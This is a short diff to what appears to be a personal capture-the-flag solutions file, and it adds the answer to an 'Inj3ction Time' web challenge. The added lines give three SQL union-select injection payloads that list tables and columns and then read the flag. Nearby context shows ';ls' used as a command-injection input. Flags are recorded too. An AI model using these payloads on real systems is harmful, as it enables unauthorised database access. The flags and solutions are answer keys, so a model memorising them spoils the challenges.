@@ -213,7 +213,13 @@ WEB:
 		flag: ctf{watch_0ut_f0r_th3_m0ng00s3}
 		solution: send `;ls` as an expression gives the list of file names in that directory. don't know how and why?
 
-
+	Inj3ction Time:
+		challenge no: 149
+		flag: abctf{uni0n_1s_4_gr34t_c0mm4nd}
+		solution: these commands words directly; `1 union all select null,table_name,null,null from information_schema.tables; --`
+			`1 union all select column_name,table_name,null,null from information_schema.columns; --`
+			`1 union all select null,f0und_m3,null,null from w0w_y0u_f0und_m3; --` grabbed the flag.
+		
 
 
 
